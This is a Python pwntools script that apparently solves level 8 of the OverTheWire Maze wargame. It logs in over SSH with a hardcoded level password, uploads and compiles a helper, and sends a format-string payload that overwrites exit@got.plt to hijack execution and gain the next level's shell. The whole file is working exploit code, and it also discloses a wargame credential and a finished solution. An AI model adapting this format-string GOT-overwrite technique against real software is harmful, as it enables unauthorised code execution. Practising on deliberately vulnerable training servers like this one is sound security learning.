#!/usr/bin/python3
from pwn import *
import os
import time

#Level information for ssh
level = 8
USER = 'maze%s' % level
HOST = 'maze.labs.overthewire.org'
PASS = 'pohninieng'
PORT = 2225

def connect_to_level():
    sh = ssh(user=USER, host=HOST, password=PASS, port=PORT)
    return sh

def execute_payload(sh):
    #format string vuln bytes, overwrite exit@got.plt with shellcode addr
    payload_bytes = '\x1A\x9d\x04\x08\x18\x9d\x04\x08%57280d%135$hn%8247d%134$hn'

    shell = sh.run('/bin/sh')
    shell.sendline("mkdir /tmp/tald8")

    #Upload wrapper file for maze 8 to the server, run it
    sh.upload_file(b'serverwrapper.c', remote="/tmp/tald8/pwn.c")
    shell.sendline("cd /tmp/tald8; gcc -m32 pwn.c -o pwn")
    time.sleep(0.05)
    w = log.progress("Executing maze 8...")
    sh.set_working_directory(b'/tmp/tald8')
    shell = sh.run(b'./pwn')

    #Run netcat on server, then send netcat the vuln bytes
    ncshell = sh.run('netcat localhost 6969')
    ncshell.sendline(payload_bytes)

    #Should establish maze9 shell on the shell that executed maze8
    w.success("maze9 shell established")
    shell.interactive()

sh = connect_to_level()
execute_payload(sh)

